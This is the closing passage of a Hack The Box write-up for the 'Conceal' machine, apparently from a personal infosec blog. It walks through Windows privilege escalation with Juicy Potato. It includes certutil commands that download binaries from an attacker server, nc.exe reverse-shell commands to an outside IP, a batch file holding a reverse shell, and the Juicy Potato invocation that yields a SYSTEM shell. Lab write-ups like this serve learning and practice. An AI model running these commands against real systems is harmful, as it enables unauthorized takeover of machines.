+<h4 id="its-microsoft-windows-10-enterprise-i-got-the-clsid-of--wuauserv-from-here-which-is--e60687f7-01a1-40aa-86ac-db1cbf673334">It’s <code class="highlighter-rouge">Microsoft Windows 10 Enterprise</code>. I got the <code class="highlighter-rouge">clsid</code> of  <code class="highlighter-rouge">wuauserv</code> from <a href="https://github.com/ohpe/juicy-potato/tree/master/CLSID/Windows_10_Enterprise">here</a> which is : <code class="highlighter-rouge">{e60687f7-01a1-40aa-86ac-db1cbf673334}</code></h4>
+<h4 id="i-got-a-compiled-binary-of-juicy-potato-from-the-github-repository-i-hosted-it-on-a-python-simple-http-server-then-i-downloaded-it-on-the-machine-with-certutil-">I got a compiled binary of <code class="highlighter-rouge">Juicy Potato</code> from the github repository. I hosted it on a python simple http server then I downloaded it on the machine with <code class="highlighter-rouge">certutil</code> :</h4>
+<p><code class="highlighter-rouge">certutil -urlcache -split -f http://10.10.xx.xx/juicypotato.exe juicypotato.exe</code>
+<img src="/images/hackthebox/conceal/23.png" alt="" /></p>
+<h4 id="however-i-had-some-problems-with-my-powershell-reverse-shell-and-it-couldnt-run-juicypotatoexe-properly-so-i-got-another-cmd-shell-with-nc-">However I had some problems with my powershell reverse shell and it couldn’t run <code class="highlighter-rouge">juicypotato.exe</code> properly so I got another <code class="highlighter-rouge">cmd</code> shell with <code class="highlighter-rouge">nc</code> :</h4>
+<p><code class="highlighter-rouge">certutil -urlcache -split -f http://10.10.xx.xx/nc.exe nc.exe</code>
+<br />
+<br />
+<code class="highlighter-rouge">nc.exe -e cmd.exe 10.10.xx.xx 1339</code>
+<img src="/images/hackthebox/conceal/24.png" alt="" />
+<br />
+<br />
+<img src="/images/hackthebox/conceal/25.png" alt="" /></p>
+<h4 id="i-created-a-bat-file-that-executes--ncexe--e-cmdexe-1010xxxx-1340-to-get-me-a-reverse-shell-">I created a <code class="highlighter-rouge">bat</code> file that executes : <code class="highlighter-rouge">nc.exe -e cmd.exe 10.10.xx.xx 1340</code> to get me a reverse shell :</h4>
+<p><code class="highlighter-rouge">echo C:\users\Destitute\appdata\local\temp\nc.exe -e cmd.exe 10.10.xx.xx 1340 &gt; rev.bat</code></p>
+<h4 id="then-i-ran-juicypotatoexe-and-made-it-execute-that-bat-file-">Then I ran <code class="highlighter-rouge">juicypotato.exe</code> and made it execute that <code class="highlighter-rouge">bat</code> file :</h4>
+<p><code class="highlighter-rouge">juicypotato.exe -p C:\users\Destitute\appdata\local\temp\rev.bat -l 1340 -t * -c {e60687f7-01a1-40aa-86ac-db1cbf673334}</code>
+<img src="/images/hackthebox/conceal/26.png" alt="" /></p>
+<h4 id="it-worked-fine-and-we-got-a-reverse-shell-as-nt-authoritysystem">It worked fine and we got a reverse shell as <code class="highlighter-rouge">nt authority\system</code></h4>
+<p><img src="/images/hackthebox/conceal/27.png" alt="" />
+<br />
+<br />
+<img src="/images/hackthebox/conceal/28.png" alt="" /></p>
+<h4 id="and-we-owned-root-">And we owned root !</h4>
+<p><br />
+<br /></p>
+<h4 id="thats-it--feedback-is-appreciated-">That’s it , Feedback is appreciated !</h4>
+<h4 id="dont-forget-to-read-the-previous-write-ups--tweet-about-the-write-up-if-you-liked-it--follow-on-twitter-for-awesome-resources-ahm3d_h3sham">Don’t forget to read the <a href="/categories">previous write-ups</a> , Tweet about the write-up if you liked it , follow on twitter for awesome resources <a href="https://twitter.com/Ahm3d_H3sham">@Ahm3d_H3sham</a></h4>
+<h4 id="thanks-for-reading">Thanks for reading.</h4>
+<p><br />
+<br /></p>
+<h4 id="previous-hack-the-box-write-up--hack-the-box---lightweight">Previous Hack The Box write-up : <a href="/hack-the-box/lightweight/">Hack The Box - Lightweight</a></h4>
+<hr />
+
+
+  </div>
+<script src="https://www.hackthebox.eu/badge/65598"></script><a class="u-url" href="/hack-the-box/conceal/" hidden></a>
+</article>
+
+
+      </div>
+    </main><footer class="site-footer h-card">
+  <data class="u-url" href="/"></data>
+
+  <div class="wrapper">
+
+    <h2 class="footer-heading">0xRick Owned Root !</h2>
+
+    <div class="footer-col-wrapper">
+      <div class="footer-col footer-col-1">
+        <ul class="contact-list">
+          <li class="p-name">0xRick Owned Root !</li></ul>
+      </div>
+
+      <div class="footer-col footer-col-2"><ul class="social-media-list"><li><a href="https://www.facebook.com/Ahm3d.H3sham"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#facebook"></use></svg> <span class="username">Ahm3d.H3sham</span></a></li><li><a href="https://github.com/0xRick"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#github"></use></svg> <span class="username">0xRick</span></a></li><li><a href="https://www.twitter.com/Ahm3d_H3sham"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#twitter"></use></svg> <span class="username">Ahm3d_H3sham</span></a></li></ul>
+</div>
+
+      <div class="footer-col footer-col-3">
+        <p>Infosec Blog , CTF and Hack The Box write-ups , articles and other stuff</p>
+      </div>
+    </div>
+
+  </div>
+
+</footer>
+</body>
+
+</html>
+
